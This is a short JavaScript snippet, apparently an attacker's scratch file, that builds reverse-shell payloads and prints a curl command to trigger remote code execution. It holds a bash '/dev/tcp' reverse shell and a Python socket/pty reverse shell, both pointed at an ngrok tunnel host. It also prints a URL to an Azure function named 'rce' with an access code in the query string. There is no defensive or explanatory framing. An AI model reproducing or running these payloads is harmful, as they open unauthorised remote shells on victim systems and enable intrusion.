const {escape} = require('querystring')

var s = escape("sh -i >& /dev/tcp/2.tcp.eu.ngrok.io/17648 0>&1")

/* var s = escape("whoami") */

var s= escape(`export RHOST="2.tcp.eu.ngrok.io";export RPORT=17648;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`)
/* var s= escape(`export RHOST="${shell.split(':')[0]}";export RPORT=${shell.split(':')[1]};python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`)
 */
var s = escape('2.tcp.eu.ngrok.io:14577')


console.log(`curl https://fn-reverseshell-26735.azurewebsites.net/api/rce?code=-jX-PfgTLvfuhyKhQ5_9erwJaS5Cn8OVhnUyvkVLr10WAzFuel14Sg==&shell=${s}`)
